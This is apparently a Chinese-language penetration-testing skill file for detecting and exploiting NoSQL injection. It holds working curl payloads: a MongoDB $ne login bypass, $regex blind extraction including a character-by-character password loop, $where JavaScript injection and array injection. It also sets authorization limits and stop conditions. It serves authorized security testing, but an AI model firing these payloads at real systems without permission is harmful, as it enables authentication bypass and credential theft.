---
name: nosql-injection
description: 检测和利用 NoSQL 注入漏洞，覆盖 MongoDB、Redis、CouchDB 等 NoSQL 数据库的注入场景。
category: web
source: xalgorix
tags:
  - NoSQL 注入
  - MongoDB
  - 数据库
  - 认证绕过
required_tools:
  - curl
---

# NoSQL 注入

## 适用场景

- 目标使用 MongoDB、CouchDB、Redis 等 NoSQL 数据库。
- API 接受 JSON 格式的查询条件，可能被注入操作符。
- 登录或搜索功能返回异常行为，但 SQL 注入测试无效。

## 授权边界

- **NoSQL 注入可能导致数据泄露或认证绕过。** 仅验证漏洞存在，不提取全量数据。
- 如果注入可绕过认证，只用自己的测试账号验证，不访问其他用户账户。

## 前置条件

- 已识别接受 JSON 查询参数的 API 端点。
- 了解目标可能使用的 NoSQL 数据库类型（从技术栈探测或错误消息判断）。

## 执行步骤

### 步骤 1：注入点识别

```bash
# 常见注入位置
# POST body JSON: {"username": "admin", "password": "xxx"}
# 查询参数: ?search=keyword
# API 过滤: /api/users?filter={"role":"user"}
```

### 步骤 2：MongoDB 操作符注入

```bash
# 认证绕过 — $ne（不等于）
curl -X POST "https://<target>/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# $regex 盲注 — 逐字符提取
curl -X POST "https://<target>/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}'
```

### 步骤 3：$where 注入（JavaScript 执行）

```bash
# 如果应用接受 $where 操作符
curl -X POST "https://<target>/api/search" \
  -H "Content-Type: application/json" \
  -d '{"query": {"$where": "sleep(5000) || true"}}'

# 如果响应延迟 5 秒，确认 $where 注入存在
```

### 步骤 4：数组注入

```bash
# 注入数组绕过类型检查
curl -X POST "https://<target>/login" \
  -H "Content-Type: application/json" \
  -d '{"username": ["admin", "user"], "password": "guess"}'
```

### 步骤 5：盲注提取

```bash
# 用 $regex 逐字符提取密码
for c in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  curl -s -X POST "https://<target>/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\": \"admin\", \"password\": {\"$regex\": \"^$c\"}}" \
    -w "$c: %{http_code}\n" -o /dev/null
done
```

## 停止条件

- 如果 `$where` 可执行任意 JavaScript，停止并报告为严重 RCE。
- 盲注提取超过 5 个字符即暂停，记录方法后报告（不进行完整密码提取）。

## 输出格式

- 注入类型（操作符注入 / $where / 数组注入）。
- 有效 payload。
- 盲注可行性。
- 数据库类型推断。

## 验收标准

1. 对所有接受 JSON 查询的端点进行了 NoSQL 操作符注入测试。
2. 至少测试了 `$ne`、`$regex`、`$where` 三种操作符。
3. 如确认注入，记录了盲注方法但未提取全量数据。
